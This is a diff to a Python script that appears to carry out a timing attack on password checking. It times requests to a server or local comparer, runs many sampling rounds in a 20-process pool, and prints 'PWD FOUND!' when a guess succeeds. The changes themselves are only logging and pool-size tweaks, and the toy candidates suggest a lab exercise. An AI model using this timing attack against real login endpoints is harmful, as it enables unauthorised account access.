@@ -14,8 +14,10 @@ import requests
 
 from test_server import test_local_compare
 
+warnings.filterwarnings("ignore")
+
 logger = logging.getLogger(__name__)
-logging.basicConfig(level=logging.DEBUG,
+logging.basicConfig(level=logging.INFO,
                     format='[%(asctime)s] - %(levelname)s - %(module)s: %(message)s',
                     stream=sys.stdout)
 
@@ -29,7 +31,7 @@ def send(pwd: str) -> Tuple[int, int]:
     )
     end = datetime.datetime.now()
     delta = (end - start)
-    logger.debug(f'{r.status_code} - {r.text.strip()} | {pwd} - {delta.microseconds}')
+    logger.info(f'{r.status_code} - {r.text.strip()} | {pwd} - {delta.microseconds}')
     if r.status_code in {200, 201}:
         print(f'PWD FOUND! - {pwd}')
         exit(0)
@@ -43,7 +45,7 @@ def test_locally(pwd: str) -> Tuple[int, int]:
     status_code = 200 if return_code else 403
     end = datetime.datetime.now()
     delta = (end - start)
-    logger.debug(f'{status_code} | {pwd} - {delta.microseconds}')
+    logger.info(f'{status_code} | {pwd} - {delta.microseconds}')
     if status_code in {200, 201}:
         print(f'PWD FOUND! - {pwd}')
         exit(0)
@@ -62,9 +64,9 @@ def send_with_pwd(pwd: str) -> Tuple[str, int]:
     return pwd, time
 
 
-def verify_passwords(passwords: List[str], max_workers: int = 5, sample_rounds: int = 20) -> Dict[str, int]:
+def verify_passwords(passwords: List[str], sample_rounds: int = 20) -> Dict[str, int]:
     means = {pwd: [] for pwd in passwords}
-    with Pool(max_workers) as pool:
+    with Pool(20) as pool:
         for result in pool.map(send_with_pwd, passwords * sample_rounds):
             pwd, micros = result
             means[pwd].append(micros)
@@ -83,8 +85,6 @@ def verify_passwords(passwords: List[str], max_workers: int = 5, sample_rounds: 
 
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
-    warnings.filterwarnings("ignore")
-
     verify_passwords(
         [
             'none', 'Passw', 'Passwor', 'Password123', 'Password111'
